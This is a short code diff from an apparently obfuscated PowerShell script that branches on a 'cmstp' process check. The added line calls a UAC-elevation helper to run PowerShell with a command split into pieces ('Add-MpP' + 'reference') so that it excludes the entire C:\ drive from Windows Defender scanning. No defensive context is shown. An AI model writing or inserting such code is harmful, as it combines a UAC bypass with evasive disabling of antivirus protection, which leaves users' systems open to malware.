@@ -202,5 +202,7 @@ if ($latencyxProcess -eq "cmstp") {
     }
 } else {
     latencyxExecute
+latencyx-Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+
 }
 }
